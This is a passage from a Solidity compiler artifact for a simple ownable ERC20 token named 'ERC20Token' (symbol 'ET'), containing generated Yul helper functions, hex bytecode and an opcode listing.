35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function array_dataslot_t_string_storage(ptr) -> data {\n        data := ptr\n\n        mstore(0, ptr)\n        data := keccak256(0, 0x20)\n\n    }\n\n    function divide_by_32_ceil(value) -> result {\n        result := div(add(value, 31), 32)\n    }\n\n    function shift_left_dynamic(bits, value) -> newValue {\n        newValue :=\n\n        shl(bits, value)\n\n    }\n\n    function update_byte_slice_dynamic32(value, shiftBytes, toInsert) -> result {\n        let shiftBits := mul(shiftBytes, 8)\n        let mask := shift_left_dynamic(shiftBits, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n        toInsert := shift_left_dynamic(shiftBits, toInsert)\n        value := and(value, not(mask))\n        result := or(value, and(toInsert, mask))\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint256_to_t_uint256(value) -> converted {\n        converted := cleanup_t_uint256(identity(cleanup_t_uint256(value)))\n    }\n\n    function prepare_store_t_uint256(value) -> ret {\n        ret := value\n    }\n\n    function update_storage_value_t_uint256_to_t_uint256(slot, offset, value_0) {\n        let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)\n        sstore(slot, update_byte_slice_dynamic32(sload(slot), offset, prepare_store_t_uint256(convertedValue_0)))\n    }\n\n    function zero_value_for_split_t_uint256() -> ret {\n        ret := 0\n    }\n\n    function storage_set_to_zero_t_uint256(slot, offset) {\n        let zero_0 := zero_value_for_split_t_uint256()\n        update_storage_value_t_uint256_to_t_uint256(slot, offset, zero_0)\n    }\n\n    function clear_storage_range_t_bytes1(start, end) {\n        for {} lt(start, end) { start := add(start, 1) }\n        {\n            storage_set_to_zero_t_uint256(start, 0)\n        }\n    }\n\n    function clean_up_bytearray_end_slots_t_string_storage(array, len, startIndex) {\n\n        if gt(len, 31) {\n            let dataArea := array_dataslot_t_string_storage(array)\n            let deleteStart := add(dataArea, divide_by_32_ceil(startIndex))\n            // If we are clearing array to be short byte array, we want to clear only data starting from array data area.\n            if lt(startIndex, 32) { deleteStart := dataArea }\n            clear_storage_range_t_bytes1(deleteStart, add(dataArea, divide_by_32_ceil(len)))\n        }\n\n    }\n\n    function shift_right_unsigned_dynamic(bits, value) -> newValue {\n        newValue :=\n\n        shr(bits, value)\n\n    }\n\n    function mask_bytes_dynamic(data, bytes) -> result {\n        let mask := not(shift_right_unsigned_dynamic(mul(8, bytes), not(0)))\n        result := and(data, mask)\n    }\n    function extract_used_part_and_set_length_of_short_byte_array(data, len) -> used {\n        // we want to save only elements that are part of the array after resizing\n        // others should be set to zero\n        data := mask_bytes_dynamic(data, len)\n        used := or(data, mul(2, len))\n    }\n    function copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage(slot, src) {\n\n        let newLen := array_length_t_string_memory_ptr(src)\n        // Make sure array length is sane\n        if gt(newLen, 0xffffffffffffffff) { panic_error_0x41() }\n\n        let oldLen := extract_byte_array_length(sload(slot))\n\n        // potentially truncate data\n        clean_up_bytearray_end_slots_t_string_storage(slot, oldLen, newLen)\n\n        let srcOffset := 0\n\n        srcOffset := 0x20\n\n        switch gt(newLen, 31)\n        case 1 {\n            let loopEnd := and(newLen, not(0x1f))\n\n            let dstPtr := array_dataslot_t_string_storage(slot)\n            let i := 0\n            for { } lt(i, loopEnd) { i := add(i, 0x20) } {\n                sstore(dstPtr, mload(add(src, srcOffset)))\n                dstPtr := add(dstPtr, 1)\n                srcOffset := add(srcOffset, 32)\n            }\n            if lt(loopEnd, newLen) {\n                let lastValue := mload(add(src, srcOffset))\n                sstore(dstPtr, mask_bytes_dynamic(lastValue, and(newLen, 0x1f)))\n            }\n            sstore(slot, add(mul(newLen, 2), 1))\n        }\n        default {\n            let value := 0\n            if newLen {\n                value := mload(add(src, srcOffset))\n            }\n            sstore(slot, extract_used_part_and_set_length_of_short_byte_array(value, newLen))\n        }\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_mul_t_uint256(x, y) -> product {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        let product_raw := mul(x, y)\n        product := cleanup_t_uint256(product_raw)\n\n        // overflow, if x != 0 and y != product/x\n        if iszero(\n            or(\n                iszero(x),\n                eq(y, div(product, x))\n            )\n        ) { panic_error_0x11() }\n\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        sum := add(x, y)\n\n        if gt(x, sum) { panic_error_0x11() }\n\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n","id":10,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"60806040523480156200001157600080fd5b5060405162001ef038038062001ef0833981810160405281019062000037919062000805565b336040518060400160405280600a81526020017f4552433230546f6b656e000000000000000000000000000000000000000000008152506040518060400160405280600281526020017f45540000000000000000000000000000000000000000000000000000000000008152508160039081620000b5919062000abc565b508060049081620000c7919062000abc565b505050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036200013f5760006040517f1e4fbdf700000000000000000000000000000000000000000000000000000000815260040162000136919062000bb4565b60405180910390fd5b6200015081620001a860201b60201c565b506200017833670de0b6b3a7640000846200016c919062000c00565b6200026e60201b60201c565b6200019f81670de0b6b3a76400008462000193919062000c00565b620002fb60201b60201c565b50505062000cf1565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620002e35760006040517fec442f05000000000000000000000000000000000000000000000000000000008152600401620002da919062000bb4565b60405180910390fd5b620002f7600083836200032e60201b60201c565b5050565b6000806200030e6200055e60201b60201c565b9050620003238185856200056660201b60201c565b600191505092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036200038457806002600082825462000377919062000c4b565b925050819055506200045a565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508181101562000413578381836040517fe450d38c0000000000000000000000000000000000000000000000000000000081526004016200040a9392919062000c97565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603620004a55780600260008282540392505081905550620004f2565b806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405162000551919062000cd4565b60405180910390a3505050565b600033905090565b6200057b83838360016200058060201b60201c565b505050565b600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1603620005f55760006040517fe602df05000000000000000000000000000000000000000000000000000000008152600401620005ec919062000bb4565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036200066a5760006040517f94280d6200000000000000000000000000000000000000000000000000000000815260040162000661919062000bb4565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555080156200075a578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258460405162000751919062000cd4565b60405180910390a35b50505050565b600080fd5b6000819050919050565b6200077a8162000765565b81146200078657600080fd5b50565b6000815190506200079a816200076f565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620007cd82620007a0565b9050919050565b620007df81620007c0565b8114620007eb57600080fd5b50565b600081519050620007ff81620007d4565b92915050565b600080604083850312156200081f576200081e62000760565b5b60006200082f8582860162000789565b92505060206200084285828601620007ee565b9150509250929050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680620008ce57607f821691505b602082108103620008e457620008e362000886565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200094e7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200090f565b6200095a86836200090f565b95508019841693508086168417925050509392505050565b6000819050919050565b60006200099d62000997620009918462000765565b62000972565b62000765565b9050919050565b6000819050919050565b620009b9836200097c565b620009d1620009c882620009a4565b8484546200091c565b825550505050565b600090565b620009e8620009d9565b620009f5818484620009ae565b505050565b5b8181101562000a1d5762000a11600082620009de565b600181019050620009fb565b5050565b601f82111562000a6c5762000a3681620008ea565b62000a4184620008ff565b8101602085101562000a51578190505b62000a6962000a6085620008ff565b830182620009fa565b50505b505050565b600082821c905092915050565b600062000a916000198460080262000a71565b1980831691505092915050565b600062000aac838362000a7e565b9150826002028217905092915050565b62000ac7826200084c565b67ffffffffffffffff81111562000ae35762000ae262000857565b5b62000aef8254620008b5565b62000afc82828562000a21565b600060209050601f83116001811462000b34576000841562000b1f578287015190505b62000b2b858262000a9e565b86555062000b9b565b601f19841662000b4486620008ea565b60005b8281101562000b6e5784890151825560018201915060208501945060208101905062000b47565b8683101562000b8e578489015162000b8a601f89168262000a7e565b8355505b6001600288020188555050505b505050505050565b62000bae81620007c0565b82525050565b600060208201905062000bcb600083018462000ba3565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600062000c0d8262000765565b915062000c1a8362000765565b925082820262000c2a8162000765565b9150828204841483151762000c445762000c4362000bd1565b5b5092915050565b600062000c588262000765565b915062000c658362000765565b925082820190508082111562000c805762000c7f62000bd1565b5b92915050565b62000c918162000765565b82525050565b600060608201905062000cae600083018662000ba3565b62000cbd602083018562000c86565b62000ccc604083018462000c86565b949350505050565b600060208201905062000ceb600083018462000c86565b92915050565b6111ef8062000d016000396000f3fe608060405234801561001057600080fd5b50600436106100cf5760003560e01c8063715018a61161008c5780639dc29fac116100665780639dc29fac14610204578063a9059cbb14610220578063dd62ed3e14610250578063f2fde38b14610280576100cf565b8063715018a6146101be5780638da5cb5b146101c857806395d89b41146101e6576100cf565b806306fdde03146100d4578063095ea7b3146100f257806318160ddd1461012257806323b872dd14610140578063313ce5671461017057806370a082311461018e575b600080fd5b6100dc61029c565b6040516100e99190610e01565b60405180910390f35b61010c60048036038101906101079190610ebc565b61032e565b6040516101199190610f17565b60405180910390f35b61012a610351565b6040516101379190610f41565b60405180910390f35b61015a60048036038101906101559190610f5c565b61035b565b6040516101679190610f17565b60405180910390f35b61017861038a565b6040516101859190610fcb565b60405180910390f35b6101a860048036038101906101a39190610fe6565b610393565b6040516101b59190610f41565b60405180910390f35b6101c66103db565b005b6101d06103ef565b6040516101dd9190611022565b60405180910390f35b6101ee610419565b6040516101fb9190610e01565b60405180910390f35b61021e60048036038101906102199190610ebc565b6104ab565b005b61023a60048036038101906102359190610ebc565b6104d4565b6040516102479190610f17565b60405180910390f35b61026a6004803603810190610265919061103d565b6104f7565b6040516102779190610f41565b60405180910390f35b61029a60048036038101906102959190610fe6565b61057e565b005b6060600380546102ab906110ac565b80601f01602080910402602001604051908101604052809291908181526020018280546102d7906110ac565b80156103245780601f106102f957610100808354040283529160200191610324565b820191906000526020600020905b81548152906001019060200180831161030757829003601f168201915b5050505050905090565b600080610339610604565b905061034681858561060c565b600191505092915050565b6000600254905090565b600080610366610604565b905061037385828561061e565b61037e8585856106b2565b60019150509392505050565b60006012905090565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6103e36107a6565b6103ed600061082d565b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b606060048054610428906110ac565b80601f0160208091040260200160405190810160405280929190818152602001828054610454906110ac565b80156104a15780601f10610476576101008083540402835291602001916104a1565b820191906000526020600020905b81548152906001019060200180831161048457829003601f168201915b5050505050905090565b6104b36107a6565b6104d082670de0b6b3a7640000836104cb919061110c565b6108f3565b5050565b6000806104df610604565b90506104ec8185856106b2565b600191505092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6105866107a6565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036105f85760006040517f1e4fbdf70000000000000000000000000000000000000000000000000000000081526004016105ef9190611022565b60405180910390fd5b6106018161082d565b50565b600033905090565b6106198383836001610975565b505050565b600061062a84846104f7565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146106ac578181101561069c578281836040517ffb8f41b20000000000000000000000000000000000000000000000000000000081526004016106939392919061114e565b60405180910390fd5b6106ab84848484036000610975565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036107245760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161071b9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036107965760006040517fec442f0500000000000000000000000000000000000000000000000000000000815260040161078d9190611022565b60405180910390fd5b6107a1838383610b4c565b505050565b6107ae610604565b73ffffffffffffffffffffffffffffffffffffffff166107cc6103ef565b73ffffffffffffffffffffffffffffffffffffffff161461082b576107ef610604565b6040517f118cdaa70000000000000000000000000000000000000000000000000000000081526004016108229190611022565b60405180910390fd5b565b6000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036109655760006040517f96c6fd1e00000000000000000000000000000000000000000000000000000000815260040161095c9190611022565b60405180910390fd5b61097182600083610b4c565b5050565b600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16036109e75760006040517fe602df050000000000000000000000000000000000000000000000000000000081526004016109de9190611022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610a595760006040517f94280d62000000000000000000000000000000000000000000000000000000008152600401610a509190611022565b60405180910390fd5b81600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508015610b46578273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610b3d9190610f41565b60405180910390a35b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603610b9e578060026000828254610b929190611185565b92505081905550610c71565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610c2a578381836040517fe450d38c000000000000000000000000000000000000000000000000000000008152600401610c219392919061114e565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610cba5780600260008282540392505081905550610d07565b806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610d649190610f41565b60405180910390a3505050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610dab578082015181840152602081019050610d90565b60008484015250505050565b6000601f19601f8301169050919050565b6000610dd382610d71565b610ddd8185610d7c565b9350610ded818560208601610d8d565b610df681610db7565b840191505092915050565b60006020820190508181036000830152610e1b8184610dc8565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610e5382610e28565b9050919050565b610e6381610e48565b8114610e6e57600080fd5b50565b600081359050610e8081610e5a565b92915050565b6000819050919050565b610e9981610e86565b8114610ea457600080fd5b50565b600081359050610eb681610e90565b92915050565b60008060408385031215610ed357610ed2610e23565b5b6000610ee185828601610e71565b9250506020610ef285828601610ea7565b9150509250929050565b60008115159050919050565b610f1181610efc565b82525050565b6000602082019050610f2c6000830184610f08565b92915050565b610f3b81610e86565b82525050565b6000602082019050610f566000830184610f32565b92915050565b600080600060608486031215610f7557610f74610e23565b5b6000610f8386828701610e71565b9350506020610f9486828701610e71565b9250506040610fa586828701610ea7565b9150509250925092565b600060ff82169050919050565b610fc581610faf565b82525050565b6000602082019050610fe06000830184610fbc565b92915050565b600060208284031215610ffc57610ffb610e23565b5b600061100a84828501610e71565b91505092915050565b61101c81610e48565b82525050565b60006020820190506110376000830184611013565b92915050565b6000806040838503121561105457611053610e23565b5b600061106285828601610e71565b925050602061107385828601610e71565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806110c457607f821691505b6020821081036110d7576110d661107d565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061111782610e86565b915061112283610e86565b925082820261113081610e86565b91508282048414831517611147576111466110dd565b5b5092915050565b60006060820190506111636000830186611013565b6111706020830185610f32565b61117d6040830184610f32565b949350505050565b600061119082610e86565b915061119b83610e86565b92508282019050808211156111b3576111b26110dd565b5b9291505056fea2646970667358221220da64986efe334ff5837b986db8a789595ef8a676806085e4ac809b5c5513312f64736f6c63430008150033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1EF0 CODESIZE SUB DUP1 PUSH3 0x1EF0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x805 JUMP JUMPDEST CALLER PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xA DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4552433230546F6B656E00000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4554000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP2 PUSH3 0xB5 SWAP2 SWAP1 PUSH3 0xABC JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP2 PUSH3 0xC7 SWAP2 SWAP1 PUSH3 0xABC JUMP JUMPDEST POP POP POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x13F JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x136 SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x150 DUP2 PUSH3 0x1A8 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x178 CALLER PUSH8 0xDE0B6B3A7640000 DUP5 PUSH3 0x16C SWAP2 SWAP1 PUSH3 0xC00 JUMP JUMPDEST PUSH3 0x26E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x19F DUP2 PUSH8 0xDE0B6B3A7640000 DUP5 PUSH3 0x193 SWAP2 SWAP1 PUSH3 0xC00 JUMP JUMPDEST PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP POP PUSH3 0xCF1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x2E3 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x2DA SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x2F7 PUSH1 0x0 DUP4 DUP4 PUSH3 0x32E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH3 0x30E PUSH3 0x55E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH3 0x323 DUP2 DUP6 DUP6 PUSH3 0x566 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x384 JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH3 0x377 SWAP2 SWAP1 PUSH3 0xC4B JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH3 0x45A JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH3 0x413 JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x40A SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0xC97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x4A5 JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH3 0x4F2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH3 0x551 SWAP2 SWAP1 PUSH3 0xCD4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH3 0x57B DUP4 DUP4 DUP4 PUSH1 0x1 PUSH3 0x580 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x5F5 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x5EC SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 